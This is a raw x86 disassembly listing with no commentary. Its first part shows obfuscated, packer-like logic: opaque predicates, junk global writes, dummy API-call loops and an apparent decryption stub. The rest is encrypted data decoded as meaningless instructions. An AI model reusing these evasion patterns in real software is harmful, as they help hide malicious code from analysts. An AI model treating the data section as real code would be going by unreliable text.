  41d175:	xor    edx,0x0
  41d178:	cmp    DWORD PTR [esp+0x28],0x70941f89
  41d180:	mov    DWORD PTR [esp+0x2c],edx
  41d184:	jne    0x41d193
  41d18a:	cmp    edx,0xffffffff
  41d18d:	je     0x41d1fc
  41d193:	mov    eax,DWORD PTR [eax+0x1c8]
  41d199:	mov    eax,DWORD PTR [eax]
  41d19b:	cdq    
  41d19c:	add    eax,edi
  41d19e:	adc    edx,0xffffffff
  41d1a1:	and    DWORD PTR [esp+0x3c],0x0
  41d1a6:	xor    edx,0x0
  41d1a9:	mov    DWORD PTR [esp+0x14],edx
  41d1ad:	mov    edx,DWORD PTR [esp+0x1c]
  41d1b1:	mov    DWORD PTR [esp+0x38],edx
  41d1b5:	xor    eax,ecx
  41d1b7:	add    DWORD PTR [esp+0x38],edi
  41d1bb:	mov    edx,DWORD PTR [esp+0x38]
  41d1bf:	adc    DWORD PTR [esp+0x3c],0xffffffff
  41d1c4:	xor    edx,ecx
  41d1c6:	mov    DWORD PTR [esp+0x28],edx
  41d1ca:	mov    edx,DWORD PTR [esp+0x3c]
  41d1ce:	xor    edx,0x0
  41d1d1:	mov    DWORD PTR [esp+0x2c],edx
  41d1d5:	cmp    DWORD PTR [esp+0x28],eax
  41d1d9:	jne    0x41d1eb
  41d1df:	mov    eax,DWORD PTR [esp+0x14]
  41d1e3:	cmp    edx,eax
  41d1e5:	je     0x41d1fc
  41d1eb:	mov    eax,DWORD PTR [esp+0x1c]
  41d1ef:	add    eax,DWORD PTR [esp+0x44]
  41d1f3:	mov    DWORD PTR [esp+0x1c],eax
  41d1f7:	jmp    0x41d259
  41d1fc:	mov    eax,ds:0x42634d
  41d201:	mov    edx,DWORD PTR ds:0x426355
  41d207:	xor    eax,edx
  41d209:	mov    ds:0x42634d,eax
  41d20e:	mov    edx,DWORD PTR ds:0x42634d
  41d214:	mov    eax,DWORD PTR [esp+0x20]
  41d218:	add    DWORD PTR [eax],edx
  41d21a:	mov    edx,DWORD PTR [esp+0x1c]
  41d21e:	mov    eax,ds:0x42634d
  41d223:	xor    edx,esi
  41d225:	add    edx,ebx
  41d227:	xor    ebx,ebx
  41d229:	add    edx,edi
  41d22b:	adc    ebx,0xffffffff
  41d22e:	xor    esi,esi
  41d230:	xor    edx,ecx
  41d232:	xor    ebx,0x0
  41d235:	add    eax,edi
  41d237:	adc    esi,0xffffffff
  41d23a:	xor    eax,ecx
  41d23c:	xor    esi,0x0
  41d23f:	cmp    eax,edx
  41d241:	jne    0x41d259
  41d247:	cmp    esi,ebx
  41d249:	jne    0x41d259
  41d24f:	mov    eax,ds:0x42634d
  41d254:	mov    ds:0x426355,eax
  41d259:	mov    eax,ds:0x4262c9
  41d25e:	push   0x4
  41d260:	add    eax,0x1cc
  41d265:	push   eax
  41d266:	lea    eax,[esp+0x2c]
  41d26a:	push   eax
  41d26b:	call   0x41d27f
  41d270:	mov    eax,DWORD PTR [esp+0x24]
  41d274:	mov    eax,DWORD PTR [eax]
  41d276:	pop    edi
  41d277:	pop    esi
  41d278:	pop    ebx
  41d279:	mov    esp,ebp
  41d27b:	pop    ebp
  41d27c:	ret    0xc
  41d27f:	push   ebp
  41d280:	mov    ebp,esp
  41d282:	sub    esp,0x10
  41d285:	mov    eax,ds:0x427c81
  41d28a:	mov    ecx,DWORD PTR ds:0x429d45
  41d290:	sub    eax,ecx
  41d292:	add    eax,DWORD PTR [eax+ecx*1]
  41d295:	mov    eax,0xf89c85b5
  41d29a:	and    DWORD PTR ds:0x426eb9,ecx
  41d2a0:	mov    DWORD PTR [ebp-0x4],eax
  41d2a3:	and    DWORD PTR ds:0x426f29,0x0
  41d2ad:	mov    edx,DWORD PTR ds:0x426f29
  41d2b3:	inc    edx
  41d2b4:	mov    DWORD PTR ds:0x426f29,edx
  41d2ba:	cmp    DWORD PTR ds:0x426f29,0xc
  41d2c1:	jge    0x41d300
  41d2c7:	jmp    0x41d2d7
  41d2cc:	push   0x4f6e
  41d2d1:	call   DWORD PTR ds:0x430a2c
  41d2d7:	cmp    DWORD PTR ds:0x426f29,0xb
  41d2de:	jne    0x41d2f3
  41d2e4:	xor    edx,edx
  41d2e6:	add    edx,DWORD PTR ds:0x426f29
  41d2ec:	inc    edx
  41d2ed:	mov    DWORD PTR ds:0x426f29,edx
  41d2f3:	cmp    DWORD PTR ds:0x426f29,0x14
  41d2fa:	jb     0x41d2ad
  41d300:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  41d307:	mov    edx,DWORD PTR ds:0x426ee9
  41d30d:	sbb    DWORD PTR ds:0x426f21,edx
  41d313:	mov    ecx,DWORD PTR [ebp-0x4]
  41d316:	mov    DWORD PTR ds:0x426ebd,0x1b
  41d320:	cmp    DWORD PTR ds:0x426ebd,0x0
  41d327:	je     0x41d371
  41d32d:	cmp    DWORD PTR ds:0x426ebd,0x2
  41d334:	jg     0x41d371
  41d33a:	jmp    0x41d345
  41d33f:	call   DWORD PTR ds:0x430a38
  41d345:	cmp    DWORD PTR ds:0x426ebd,0x3
  41d34c:	jne    0x41d35f
  41d352:	mov    edx,DWORD PTR ds:0x426ebd
  41d358:	dec    edx
  41d359:	mov    DWORD PTR ds:0x426ebd,edx
  41d35f:	mov    edx,DWORD PTR ds:0x426ebd
  41d365:	dec    edx
  41d366:	mov    DWORD PTR ds:0x426ebd,edx
  41d36c:	jmp    0x41d320
  41d371:	push   esi
  41d372:	or     edx,0x1404
  41d378:	mov    edx,0x75108b3
  41d37d:	mov    esi,DWORD PTR ds:0x426eb5
  41d383:	and    DWORD PTR ds:0x426e95,esi
  41d389:	xor    ecx,edx
  41d38b:	xor    esi,DWORD PTR ds:0x426eb9
  41d391:	mov    esi,0x3272fa
  41d396:	push   edi
  41d397:	xor    DWORD PTR ds:0x426ec5,0xe12
  41d3a1:	mov    edi,DWORD PTR [ebp+0x10]
  41d3a4:	add    ecx,esi
  41d3a6:	mov    DWORD PTR ds:0x426f09,0x182c
  41d3b0:	cmp    ecx,edi
  41d3b2:	je     0x41d4a2
  41d3b8:	mov    ecx,DWORD PTR [ebp-0x4]
  41d3bb:	movzx  edi,WORD PTR ds:0x426f09
  41d3c2:	add    DWORD PTR ds:0x426ea5,edi
  41d3c8:	mov    edi,DWORD PTR [ebp+0x10]
  41d3cb:	xor    eax,eax
  41d3cd:	xor    ecx,edx
  41d3cf:	add    ecx,esi
  41d3d1:	add    DWORD PTR ds:0x426ed1,0x330a
  41d3db:	add    edi,0xfabdbecd
  41d3e1:	mov    DWORD PTR ds:0x426ee5,0x5f33
  41d3eb:	adc    eax,0xffffffff
  41d3ee:	and    DWORD PTR ds:0x426ecd,0x4eeb
  41d3f8:	xor    eax,0x0
  41d3fb:	mov    DWORD PTR [ebp-0xc],eax
  41d3fe:	push   ebx
  41d3ff:	xor    ebx,ebx
  41d401:	xor    edi,0x8a29a147
  41d407:	mov    eax,ecx
  41d409:	add    eax,0xfabdbecd
  41d40e:	adc    ebx,0xffffffff
  41d411:	xor    eax,0x8a29a147
  41d416:	xor    ebx,0x0
  41d419:	cmp    eax,edi
  41d41b:	jne    0x41d434
  41d421:	cmp    ebx,DWORD PTR [ebp-0xc]
  41d424:	je     0x41d49c
  41d42a:	jmp    0x41d434
  41d42f:	mov    esi,0x3272fa
  41d434:	mov    eax,DWORD PTR [ebp-0x4]
  41d437:	mov    edi,DWORD PTR [ebp-0x8]
  41d43a:	xor    edi,edx
  41d43c:	add    edi,esi
  41d43e:	mov    esi,DWORD PTR [ebp+0x8]
  41d441:	imul   edi,ecx
  41d444:	mov    ebx,DWORD PTR [ebp+0xc]
  41d447:	xor    eax,edx
  41d449:	add    eax,ecx
  41d44b:	mov    al,BYTE PTR [ebx+eax*1+0x3272fa]
  41d452:	mov    BYTE PTR [edi+esi*1],al
  41d455:	mov    eax,DWORD PTR [ebp-0x8]
  41d458:	mov    esi,DWORD PTR [ebp+0x10]
  41d45b:	xor    eax,edx
  41d45d:	xor    ebx,ebx
  41d45f:	add    esi,0xfabdbecd
  41d465:	adc    ebx,0xffffffff
  41d468:	lea    ecx,[ecx+eax*1+0x3272fa]
  41d46f:	xor    edi,edi
  41d471:	xor    esi,0x8a29a147
  41d477:	xor    ebx,0x0
  41d47a:	mov    eax,ecx
  41d47c:	add    eax,0xfabdbecd
  41d481:	adc    edi,0xffffffff
  41d484:	xor    eax,0x8a29a147
  41d489:	xor    edi,0x0
  41d48c:	cmp    eax,esi
  41d48e:	jne    0x41d42f
  41d494:	cmp    edi,ebx
  41d496:	jne    0x41d42f
  41d49c:	mov    eax,0xf89c85b4
  41d4a1:	pop    ebx
  41d4a2:	pop    edi
  41d4a3:	pop    esi
  41d4a4:	leave  
  41d4a5:	ret    0xc
  41d4a8:	push   ebp
  41d4a9:	mov    ebp,esp
  41d4ab:	push   ecx
  41d4ac:	and    DWORD PTR ds:0x426e8d,0x0
  41d4b6:	mov    eax,ds:0x426e8d
  41d4bb:	inc    eax
  41d4bc:	mov    ds:0x426e8d,eax
  41d4c1:	cmp    DWORD PTR ds:0x426e8d,0x1c
  41d4c8:	jge    0x41d4eb
  41d4ce:	jmp    0x41d4de
  41d4d3:	push   0x5eb6
  41d4d8:	call   DWORD PTR ds:0x430a3c
  41d4de:	cmp    DWORD PTR ds:0x426e8d,0x1a
  41d4e5:	jb     0x41d4b6
  41d4eb:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41d4f2:	neg    DWORD PTR ds:0x426e9d
  41d4f8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4fb:	or     ecx,edx
  41d4fd:	movsx  eax,BYTE PTR [eax]
  41d500:	sub    ecx,ecx
  41d502:	jmp    0x41f875
  41d507:	ret    0x203
  41d50a:	add    BYTE PTR [edx-0x7e],0x42
  41d50e:	inc    ebx
  41d50f:	cmc    
  41d510:	in     al,0x42
  41d512:	sub    dh,bh
  41d514:	jmp    0xfea40b5f
  41d519:	jp     0x41d596
  41d51b:	rcr    DWORD PTR [ebx+edi*2-0x1be77d85],1
  41d522:	and    eax,0x25e081b5
  41d527:	xchg   esp,eax
  41d528:	cmp    eax,0x5ea4001b
  41d52d:	sbb    DWORD PTR [edx],edi
  41d52f:	jmp    0xb501f120
  41d534:	and    BYTE PTR [ebx+0x36e179c6],0x5c
  41d53b:	xchg   esi,eax
  41d53c:	add    eax,0xf24228c2
  41d541:	fucom  st(0)
  41d543:	xchg   edi,eax
  41d544:	jg     0x41d5c4
  41d546:	mov    al,ds:0x467066b8
  41d54b:	dec    edi
  41d54c:	and    al,cl
  41d54e:	mov    edx,0x12a09c2d
  41d553:	scas   eax,DWORD PTR es:[edi]
  41d554:	inc    ebx
  41d555:	or     ah,0xa9
  41d558:	inc    esi
  41d559:	out    dx,al
  41d55a:	loopne 0x41d530
  41d55c:	dec    esi
  41d55d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d55e:	cmp    eax,0x34d0f0e7
  41d563:	mov    ds:0x891ec985,al
  41d568:	out    dx,al
  41d569:	in     eax,dx
  41d56a:	sahf   
  41d56b:	fld    DWORD PTR [edx]
  41d56d:	sub    BYTE PTR [edx+0x1e86b7d8],cl
  41d573:	inc    ebp
  41d574:	mov    BYTE PTR [esi-0x80],bl
  41d577:	jle    0x41d5de
  41d579:	test   BYTE PTR ds:0xb2650627,0xe2
  41d580:	jg     0x41d59b
  41d582:	adc    DWORD PTR [ebx+0x77234919],eax
  41d588:	mov    DWORD PTR [esi-0x2c97df07],esi
  41d58e:	scas   al,BYTE PTR es:[edi]
  41d58f:	pop    ds
  41d590:	cwde   
  41d591:	ins    BYTE PTR es:[edi],dx
  41d592:	adc    BYTE PTR [esi-0x3],ch
  41d595:	pop    ds
  41d596:	jo     0x41d559
  41d598:	sbb    bl,bh
  41d59a:	push   esp
  41d59b:	fsub   DWORD PTR [esi]
  41d59d:	sbb    dh,BYTE PTR [edx+ebp*1+0x77]
  41d5a1:	push   ebp
  41d5a2:	pop    ecx
  41d5a3:	jae    0x41d617
  41d5a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5a6:	and    al,0xc3
  41d5a8:	data16 (bad) 
  41d5aa:	fstp   DWORD PTR [ecx-0x471ccbe6]
  41d5b0:	push   esp
  41d5b1:	sbb    BYTE PTR [ecx-0x71efa06f],dl
  41d5b7:	ins    BYTE PTR es:[edi],dx
  41d5b8:	sahf   
  41d5b9:	retf   
  41d5ba:	xor    eax,0xf782fafd
  41d5bf:	bnd jne 0x41d5d0
  41d5c2:	ret    0xf658
  41d5c5:	cli    
  41d5c6:	into   
  41d5c7:	xchg   ebx,eax
  41d5c8:	popf   
  41d5c9:	cli    
  41d5ca:	jl     0x41d582
  41d5cc:	push   es
  41d5cd:	push   es
  41d5ce:	push   eax
  41d5cf:	in     al,dx
  41d5d0:	mov    ?,WORD PTR [edi+0x31aa009e]
  41d5d6:	stc    
  41d5d7:	jg     0x41d5a1
  41d5d9:	sbb    DWORD PTR [edi-0x71a512d7],edi
  41d5df:	and    eax,0x72a25b63
  41d5e4:	enter  0x5cc4,0x4
  41d5e8:	call   0xa831da42
  41d5ed:	pop    esi
  41d5ee:	aam    0xfb
  41d5f0:	sub    DWORD PTR [edx+ebx*4],ebx
  41d5f3:	jmp    0x41d627
  41d5f5:	int    0x7d
  41d5f7:	dec    ebp
  41d5f8:	adc    al,0xa4
  41d5fa:	je     0x41d5d2
  41d5fc:	out    dx,eax
  41d5fd:	jp     0x41d5e4
  41d5ff:	or     BYTE PTR [ecx-0x6e],0x54
  41d603:	push   ebp
  41d604:	cmc    
  41d605:	cmc    
  41d606:	cmp    eax,0x9d5aa387
  41d60b:	(bad)  
  41d60c:	jl     0x41d5c3
  41d60e:	fild   QWORD PTR [edi]
  41d610:	jp     0x41d601
  41d612:	dec    ecx
  41d613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d614:	jae    0x41d5b9
  41d616:	std    
  41d617:	pop    ecx
  41d618:	outs   dx,DWORD PTR ds:[esi]
  41d619:	(bad)  
  41d61a:	jb     0x41d690
  41d61c:	ror    DWORD PTR [edi+0xcbaf9ad],0xae
  41d623:	pop    eax
  41d624:	rol    BYTE PTR [ebx+0x1],1
  41d627:	inc    ecx
  41d628:	icebp  
  41d629:	loopne 0x41d66a
  41d62b:	(bad)  
  41d62c:	stos   BYTE PTR es:[edi],al
  41d62d:	xchg   esi,eax
  41d62e:	jns    0x41d627
  41d630:	push   esi
  41d631:	jmp    0x41d66b
  41d633:	push   edx
  41d634:	in     al,dx
  41d635:	sub    DWORD PTR [eax+0x1547376a],ebp
  41d63b:	popf   
  41d63c:	mov    ah,0xd6
  41d63e:	jecxz  0x41d5fd
  41d640:	fsub   st(2),st
  41d642:	xor    al,0x96
  41d644:	pop    ebp
  41d645:	and    BYTE PTR [eax-0x3],0xac
  41d649:	adc    edi,0xffffffd8
  41d64c:	sub    cl,BYTE PTR [eax+ecx*8+0x33]
  41d650:	mov    ebx,0x43a297b7
  41d655:	cdq    
  41d656:	xor    al,dh
  41d658:	mov    esp,0x64b98477
  41d65d:	push   ebp
  41d65e:	fisub  WORD PTR [ebx]
  41d660:	push   ss
  41d661:	xor    eax,0xbdfa5e2a
  41d666:	(bad)  
  41d668:	in     al,0x92
  41d66a:	inc    ecx
  41d66b:	push   0xffffff8f
  41d66d:	push   edx
  41d66e:	add    cl,BYTE PTR [ecx+0x74]
  41d671:	ret    0x623e
  41d674:	push   ecx
  41d675:	(bad)  
  41d677:	mov    eax,ds:0x9b515f1f
  41d67c:	ins    BYTE PTR es:[edi],dx
  41d67d:	call   0x3faf:0x994a6c91
  41d684:	test   dh,dl
  41d686:	xlat   BYTE PTR ds:[ebx]
  41d687:	imul   DWORD PTR [edx]
  41d689:	add    BYTE PTR [ebx+0x2e1f7667],dh
  41d68f:	push   ds
  41d690:	lahf   
  41d691:	push   ebp
  41d692:	xor    BYTE PTR [edi-0xd7f88e0],dl
  41d698:	arpl   ax,bx
  41d69a:	les    ebx,FWORD PTR es:[edi+edi*1-0xe0adbc1]
  41d6a2:	dec    sp
  41d6a4:	mov    ?,WORD PTR [eax-0x70]
  41d6a7:	add    DWORD PTR [eax-0x70],ebx
  41d6aa:	xchg   edx,eax
  41d6ab:	sti    
  41d6ac:	pop    ebp
  41d6ad:	inc    ebx
  41d6ae:	in     eax,dx
  41d6af:	jle    0x41d6c3
  41d6b1:	(bad)  
  41d6b2:	cmc    
  41d6b3:	sbb    BYTE PTR [edi-0xdd62ac],dh
  41d6b9:	xchg   BYTE PTR ds:[edi-0x6675e876],bh
  41d6c0:	sti    
  41d6c1:	xor    BYTE PTR [edi-0x43035b57],cl
  41d6c7:	push   es
  41d6c8:	shl    DWORD PTR [esi-0x5c],0x94
  41d6cc:	pop    ss
  41d6cd:	jle    0x41d685
  41d6cf:	nop
  41d6d0:	ror    DWORD PTR [ebx+0x51],0xdf
  41d6d4:	sbb    ebp,ebp
  41d6d6:	jo     0x41d747
  41d6d8:	dec    ebx
  41d6d9:	and    edi,DWORD PTR [ecx+esi*2+0x4acb209c]
  41d6e0:	repz mov ds:0x69092b34,eax
  41d6e6:	ja     0x41d682
  41d6e8:	into   
  41d6e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6ea:	xchg   esp,eax
  41d6eb:	sub    DWORD PTR [edx+edi*2-0xaa53177],edx
  41d6f2:	fist   WORD PTR [eax]
  41d6f4:	hlt    
  41d6f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6f6:	ficom  WORD PTR [edx+0xa]
  41d6f9:	enter  0xe4a1,0xf8
  41d6fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6fe:	fdivr  st(0),st
  41d700:	loope  0x41d756
  41d702:	int3   
  41d703:	lahf   
  41d704:	ret    
  41d705:	and    cl,BYTE PTR ds:0x6f942712
  41d70b:	or     ebp,edi
  41d70d:	cld    
  41d70e:	lock cli 
  41d710:	cmp    eax,0x7397900c
  41d715:	fwait
  41d716:	push   ebp
  41d717:	mov    bh,0x71
  41d719:	adc    esi,DWORD PTR ds:0x17d9c2db
  41d71f:	dec    ebx
  41d720:	stos   DWORD PTR es:[edi],eax
  41d721:	push   cs
  41d722:	(bad)  
  41d723:	arpl   bx,si
  41d725:	pop    esp
  41d726:	sub    eax,esi
  41d728:	mov    bl,0x8
  41d72a:	push   ebx
  41d72b:	mov    ah,0x41
  41d72d:	ror    al,1
  41d72f:	cmp    al,0x62
  41d731:	cmp    eax,0x48b648e0
  41d736:	mov    ebp,0x64842483
  41d73b:	out    dx,eax
  41d73c:	or     DWORD PTR [eax-0x7f3dface],eax
  41d742:	sub    ebx,esp
  41d744:	outs   dx,BYTE PTR ds:[esi]
  41d745:	(bad)  [edx-0x71]
  41d748:	or     BYTE PTR [edx+0x1f],al
  41d74b:	push   ecx
  41d74c:	sbb    DWORD PTR [ecx+0x60],ebx
  41d74f:	add    dh,ch
  41d751:	mov    ebp,0xa9dff71f
  41d756:	mov    eax,0x147ad735
  41d75b:	cmp    DWORD PTR [ebx+0x378c97bc],edx
  41d761:	inc    ebp
  41d762:	nop
  41d763:	test   DWORD PTR [esi+0x78b58c60],esi
  41d769:	scas   al,BYTE PTR es:[edi]
  41d76a:	in     eax,dx
  41d76b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d76c:	(bad)  
  41d76d:	or     DWORD PTR ss:[esp+ebp*1+0x436cfe0e],edx
  41d775:	xchg   ebp,eax
  41d776:	(bad)  
  41d777:	xor    DWORD PTR [ecx],esp
  41d779:	jmp    0x41d7e5
  41d77b:	in     al,0xc1
  41d77d:	push   esi
  41d77e:	mov    esp,0xfd95db44
  41d783:	jo     0x41d760
  41d785:	repnz gs lahf 
  41d788:	call   0x4df52c1c
  41d78d:	(bad)  
  41d78e:	(bad)  
  41d78f:	(bad)  
  41d791:	or     al,0xf5
  41d793:	enter  0xa664,0xe4
  41d797:	pop    esi
  41d798:	mov    bh,cl
  41d79a:	cmp    cl,ah
  41d79c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d79d:	adc    BYTE PTR [esp+eax*8],0xde
  41d7a1:	pop    esi
  41d7a2:	retf   
  41d7a3:	mov    ch,0x8
  41d7a5:	cs cwde 
  41d7a7:	jmp    0x527e:0xecab06af
  41d7ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7af:	cwde   
  41d7b0:	dec    edx
  41d7b1:	fbld   TBYTE PTR [eax+edx*1-0x4c]
  41d7b5:	inc    ebp
  41d7b6:	loopne 0x41d815
  41d7b8:	sub    esp,DWORD PTR [esi+0x26]
  41d7bb:	ins    BYTE PTR es:[edi],dx
  41d7bc:	test   BYTE PTR [ebp+0x20b3c5c5],dh
  41d7c2:	dec    edx
  41d7c3:	fcmovbe st,st(0)
  41d7c5:	inc    ebp
  41d7c6:	popa   
  41d7c7:	xchg   DWORD PTR [ebp+0x44],eax
  41d7ca:	fcom   DWORD PTR [ebp*2-0x48ea9323]
  41d7d1:	cmp    edi,DWORD PTR [ecx]
  41d7d3:	or     ebp,DWORD PTR [esi]
  41d7d5:	mov    cl,BYTE PTR [edi+0x4fa8b6b0]
  41d7db:	pop    ebx
  41d7dc:	xor    ch,ch
  41d7de:	cwde   
  41d7df:	inc    esi
  41d7e0:	call   0x1a6abe52
  41d7e5:	pop    edx
  41d7e6:	mov    dl,0x14
  41d7e8:	mov    cl,0x98
  41d7ea:	sar    al,1
  41d7ec:	and    DWORD PTR [esi+0xb],ebx
  41d7ef:	fwait
  41d7f0:	push   ds
  41d7f1:	hlt    
  41d7f2:	lea    edx,[ebp+0x556bd186]
  41d7f8:	jb     0x41d84a
  41d7fa:	out    dx,eax
  41d7fb:	fwait
  41d7fc:	test   esp,ecx
  41d7fe:	ins    BYTE PTR es:[edi],dx
  41d7ff:	(bad)
  41d803:	popf   
  41d804:	mov    bl,0x85
  41d806:	retf   
  41d807:	clc    
  41d808:	in     eax,dx
  41d809:	ins    DWORD PTR es:[edi],dx
  41d80a:	enter  0x8cd,0x48
  41d80e:	outs   dx,DWORD PTR ds:[esi]
  41d80f:	data16 fisttp WORD PTR [edx+0x34]
  41d813:	scas   eax,DWORD PTR es:[edi]
  41d814:	out    dx,al
  41d815:	mov    dl,0x7d
  41d817:	pop    ss
  41d818:	push   0xffffffba
  41d81a:	xor    edi,esi
  41d81c:	icebp  
  41d81d:	mov    edi,0xa69b7ed0
  41d822:	xchg   ebx,eax
  41d823:	cmp    ecx,DWORD PTR [ecx-0x1f]
  41d826:	or     BYTE PTR [ebx-0x46e072d7],0xa
  41d82d:	ror    al,0x1d
  41d830:	cs (bad) 
  41d832:	sbb    DWORD PTR [ebp+0x47],ebp
  41d835:	jmp    0x41d85a
  41d837:	adc    DWORD PTR [esi-0x10],edx
  41d83a:	jne    0x41d801
  41d83c:	fidiv  DWORD PTR [edi]
  41d83e:	dec    ebx
  41d83f:	jbe    0x41d7c2
  41d841:	push   eax
  41d842:	imul   ebp,DWORD PTR [esi+0x5879363f],0x18
  41d849:	sbb    BYTE PTR [ebp+0x1],ch
  41d84c:	loopne 0x41d8a1
  41d84e:	push   ebx
  41d84f:	scas   al,BYTE PTR es:[edi]
  41d850:	adc    al,0x4b
  41d852:	xor    ebx,DWORD PTR [esi+0x2a67a36c]
  41d858:	jge    0x41d844
  41d85a:	outs   dx,DWORD PTR ds:[esi]
  41d85b:	mov    DWORD PTR [edi+0x2b10ad83],0x421763ff
  41d865:	retf   
  41d866:	cld    
  41d867:	repnz fcmove st,st(0)
  41d86a:	add    edx,edx
  41d86c:	cdq    
  41d86d:	in     eax,0x80
  41d86f:	cli    
  41d870:	js     0x41d825
  41d872:	inc    eax
  41d873:	jecxz  0x41d853
  41d875:	mov    WORD PTR [edx-0x7cd204bd],?
  41d87b:	dec    ebx
  41d87c:	dec    edi
  41d87d:	mov    eax,ds:0xe141e911
  41d882:	inc    esp
  41d883:	cli    
  41d884:	popf   
  41d885:	pusha  
  41d886:	or     DWORD PTR [edx-0x5258f0f6],edi
  41d88c:	jl     0x41d8b6
  41d88e:	mov    ?,WORD PTR [esi-0x7d]
  41d891:	je     0x41d8ee
  41d893:	test   DWORD PTR [edi-0x7b],ebp
  41d896:	sub    al,0x58
  41d898:	push   ds
  41d899:	fs loope 0x41d900
  41d89c:	fcomp  QWORD PTR [edx]
  41d89e:	fsub   st,st(6)
  41d8a0:	xchg   esp,eax
  41d8a1:	and    eax,0x836e42e4
  41d8a6:	popa   
  41d8a7:	jge    0x41d89e
  41d8a9:	scas   eax,DWORD PTR es:[edi]
  41d8aa:	test   BYTE PTR [ebx+esi*1+0x426498e1],al
  41d8b1:	inc    ecx
  41d8b2:	je     0x41d851
  41d8b4:	dec    esi
  41d8b5:	jp     0x41d899
  41d8b7:	div    ebx
  41d8b9:	pop    eax
  41d8ba:	fcmovbe st,st(0)
  41d8bc:	adc    eax,0x1e881790
  41d8c1:	cmp    al,0xca
  41d8c3:	js     0x41d8ec
  41d8c5:	enter  0xddb0,0x8e
  41d8c9:	bnd ret 0xb693
  41d8cd:	jmp    FWORD PTR [eax+0x54]
  41d8d0:	sahf   
  41d8d1:	mov    dl,0x73
  41d8d3:	(bad)  
  41d8d4:	push   esi
  41d8d5:	jl     0x41d8ff
  41d8d7:	mov    edx,0x2190a8c8
  41d8dc:	fldenv [ecx-0x524edb8b]
  41d8e2:	mov    al,ds:0x58b0b346
  41d8e7:	push   ebx
  41d8e8:	mov    ecx,0xedf966f4
  41d8ed:	xlat   BYTE PTR ds:[ebx]
  41d8ee:	jmp    0x41d89c
  41d8f0:	imul   DWORD PTR [eax+0x6c]
  41d8f3:	inc    ebx
  41d8f4:	pop    edx
  41d8f5:	lds    ecx,FWORD PTR [esi+ebx*1-0x66]
  41d8f9:	sub    esp,ebx
  41d8fb:	test   al,0x54
  41d8fd:	mov    dh,0x2b
  41d8ff:	gs or  eax,0x2488bc87
  41d905:	(bad)  
  41d906:	push   edx
  41d907:	test   BYTE PTR ds:0x68845374,cl
  41d90d:	jl     0x41d961
  41d90f:	and    eax,DWORD PTR [edi-0x67]
  41d912:	add    BYTE PTR [edx],ah
  41d914:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d915:	jmp    0x41d94b
  41d917:	pop    ebx
  41d918:	add    BYTE PTR [edi],0x14
  41d91b:	bound  esp,QWORD PTR ds:[esi+esi*8-0x52]
  41d920:	fsubr  DWORD PTR [edx+0x42]
  41d923:	stos   DWORD PTR es:[edi],eax
  41d924:	mov    eax,0xa58999aa
  41d929:	mov    ebp,ecx
  41d92b:	jb     0x41d92b
  41d92d:	out    dx,eax
  41d92e:	retf   
  41d92f:	xchg   ebx,eax
  41d930:	xor    eax,0x53b42931
  41d935:	add    ch,BYTE PTR [eax]
  41d937:	ins    BYTE PTR es:[edi],dx
  41d938:	inc    ebx
  41d93a:	sbb    eax,0x45a5f0f6
  41d93f:	pop    es
  41d940:	shl    BYTE PTR [ecx],1
  41d942:	inc    edi
  41d943:	dec    ecx
  41d944:	out    dx,eax
  41d945:	aas    
  41d946:	mov    bl,BYTE PTR [edx+esi*8+0x38]
  41d94a:	setno  BYTE PTR [ebx]
  41d94d:	sbb    edi,DWORD PTR [eax+edi*1-0x62]
  41d951:	sbb    ecx,ebp
  41d953:	mov    bh,0x8d
  41d955:	into   
  41d956:	push   ss
  41d957:	sub    ah,BYTE PTR [ecx]
  41d959:	(bad)  
  41d95a:	gs push esp
  41d95c:	sbb    esp,DWORD PTR [edi+ebp*2]
  41d95f:	test   BYTE PTR [eax-0x106329a0],dh
  41d965:	push   esp
  41d966:	xchg   ebx,eax
  41d967:	jmp    0x29d3afd8
  41d96c:	gs sub eax,0x5b2a30c8
  41d972:	cmp    BYTE PTR [eax-0x78],0xb8
  41d976:	or     eax,0x251842ce
  41d97b:	aas    
  41d97c:	out    dx,al
  41d97d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d97e:	loop   0x41d9ad
  41d980:	or     esi,DWORD PTR [ebx+0x36]
  41d983:	stc    
  41d984:	jecxz  0x41d9ed
  41d986:	fs aas 
  41d988:	jmp    0x41d9a1
  41d98a:	das    
  41d98b:	fidivr WORD PTR [edi+0x65335994]
  41d991:	xchg   esi,eax
  41d992:	xchg   ecx,eax
  41d993:	out    dx,al
  41d994:	add    edx,0xfb03bb90
  41d99a:	push   0x62095584
  41d99f:	ret    
  41d9a0:	sbb    ch,dh
  41d9a2:	loop   0x41d9d3
  41d9a4:	into   
  41d9a5:	(bad)  [edi-0x64]
  41d9a8:	mov    ah,0x2
  41d9aa:	(bad)  
  41d9ab:	push   edx
  41d9ac:	es jge 0x41d971
  41d9af:	mov    dl,0xa4
  41d9b1:	and    edi,ebp
  41d9b3:	dec    ebx
  41d9b4:	add    ebp,DWORD PTR [esp+ecx*2]
  41d9b7:	mov    dh,0x1d
  41d9b9:	push   ebx
  41d9ba:	mov    dh,0x7
  41d9bc:	dec    edx
  41d9bd:	and    ch,BYTE PTR [edx-0x68c29e3]
  41d9c3:	data16 jno 0x41d987
  41d9c6:	es call 0x1dc38a68
  41d9cc:	sbb    dl,BYTE PTR [esi-0x2c]
  41d9cf:	jle    0x41da25
  41d9d1:	xlat   BYTE PTR ds:[ebx]
  41d9d2:	sbb    BYTE PTR [edx+eiz*1+0x1dc9ce1c],0xc6
  41d9da:	ret    
  41d9db:	or     BYTE PTR [ebx+0x12b2e8ef],dl
  41d9e1:	push   edx
  41d9e2:	push   eax
  41d9e3:	sub    al,0x36
  41d9e5:	pop    edi
  41d9e6:	pop    edx
  41d9e7:	retf   
  41d9e8:	dec    edi
  41d9e9:	pop    edx
